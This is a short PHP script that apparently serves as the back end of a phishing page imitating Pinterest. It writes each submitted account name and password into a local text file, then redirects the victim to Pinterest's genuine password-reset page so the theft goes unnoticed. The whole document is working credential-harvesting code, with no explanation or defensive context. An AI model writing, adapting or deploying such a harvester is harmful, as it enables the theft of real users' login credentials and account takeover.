<?php

file_put_contents("usernames.txt", "Account: " . $_POST['id'] . "\nPass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.pinterest.com/password/reset/');
exit();
